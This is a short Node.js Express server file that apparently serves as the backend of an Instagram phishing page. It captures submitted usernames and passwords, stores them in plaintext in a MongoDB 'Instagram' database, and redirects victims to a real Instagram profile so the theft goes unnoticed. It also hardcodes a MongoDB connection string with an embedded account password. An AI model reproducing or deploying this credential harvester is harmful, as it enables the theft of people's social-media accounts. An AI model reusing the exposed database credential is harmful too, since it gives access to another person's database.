const express = require("express");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");

const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));

// Connect to MongoDB database
const uri =
  "mongodb+srv://ayyadav179:kereG1tTfYHYl9JV@cluster0.vtqomkg.mongodb.net/Instagram?retryWrites=true&w=majority";
const db = mongoose.connect(uri).then(console.log("connected to database❤️"));
const collection = mongoose.connection.collection("users");

// Define route to store form data
app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html");
});

app.use(express.static("public"));

// Define the function to handle form submission
const handleFormSubmit = (req, res) => {
  const { username, password } = req.body;

  // Insert data into database
  collection.insertOne({ username, password }, (err, result) => {
    if (err) {
      console.log(err);
      res.status(500).send("Internal server error");
      return;
    }
    console.log("Data stored in database");
    res.redirect("https://www.instagram.com/palwal_club/");
  });
};

// Define the route to handle form submission
app.post("/", handleFormSubmit);

// Start server
app.listen(process.env.PORT || port, () => {
  console.log(`Server started on port ${port}`);
});
